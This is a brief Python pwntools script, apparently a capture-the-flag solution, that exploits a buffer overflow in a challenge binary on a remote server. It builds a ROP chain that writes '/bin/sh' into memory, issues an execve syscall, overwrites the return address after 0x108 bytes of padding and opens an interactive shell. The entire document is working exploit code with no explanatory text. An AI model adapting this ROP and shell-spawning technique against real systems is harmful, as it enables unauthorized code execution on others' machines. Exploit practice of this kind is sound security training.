from pwn import *

elf = ELF("./chal_patched")

context.binary = elf

# p = process(stdout=PIPE)
p = remote("tcp.ybn.sg", 14977)
# gdb.attach(p)

pop_rax_ret = 0x0000000000419103
pop_rdi_ret = 0x0000000000472463
pop_rsi_ret = 0x0000000000476b7f
mov_rdi_rax_ret = 0x0000000000451bbb
syscall = 0x000000000040068b

payload = flat(
    pop_rax_ret, b'/bin/sh\x00',
    pop_rdi_ret, 0x4a60b8,
    mov_rdi_rax_ret,
    pop_rax_ret, 59,
    pop_rsi_ret, 0,
    0x000000000040068b
).ljust(0x108) + pack(0x00000000004002ae)
p.sendline(payload)

p.interactive()
